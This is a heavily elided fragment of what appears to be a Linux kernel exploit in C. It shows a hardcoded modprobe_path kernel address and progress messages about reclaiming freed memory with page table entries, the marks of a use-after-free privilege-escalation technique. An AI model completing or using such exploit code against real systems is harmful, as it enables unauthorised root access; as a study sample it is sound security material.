 ...
 *  - create a PTE to reclaim the freed memory
...
#define MODPROBE_PATH_ADDR 0xffffffff82d486a0lu
...
int main(void)
{
	...
	printf("[+] done, now create a PTE\n");

	printf("[!] create a PTE to reclaim the freed memory\n");
	for (i = 0; i < PT_ENTRIES; i++) {
